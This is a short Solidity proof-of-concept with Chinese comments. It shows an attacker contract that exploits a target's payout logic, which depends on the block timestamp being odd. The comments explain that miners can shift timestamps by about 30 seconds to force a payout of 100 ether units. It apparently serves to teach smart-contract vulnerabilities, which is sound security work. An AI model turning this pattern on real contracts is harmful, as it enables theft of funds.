// 攻擊者合約
contract BlockTimestampAttacker {
    Test target;
    
    constructor(address targetAddress) {
        target = Test(targetAddress);
    }
    
    function attack() external {
        // 攻擊者可以等到時間戳為奇數時再呼叫合約
        // 礦工可以在一定範圍內操縱時間戳（約30秒），使其為奇數
        // 在實際攻擊中，攻擊者可能與礦工合謀或自己就是礦工
        target.pay();
    }
    
    // 接收合約傳送的以太幣
    receive() external payable {}
}

/* 
攻擊說明：
1. 此漏洞的核心問題是依賴區塊鏈變數（如時間戳）來控制支付邏輯。
2. 礦工可以在一定範圍內（通常為30秒）操縱區塊時間戳。
3. 若礦工也是攻擊者，或與攻擊者合謀，可以確保在產生區塊時將時間戳設為奇數值。
4. 攻擊者只需等待時間戳為奇數時調用pay()函數，就能保證每次都收到100單位的以太幣。
5. 這使得原本設計為有條件支付的邏輯變成可被操控的定向支付。
*/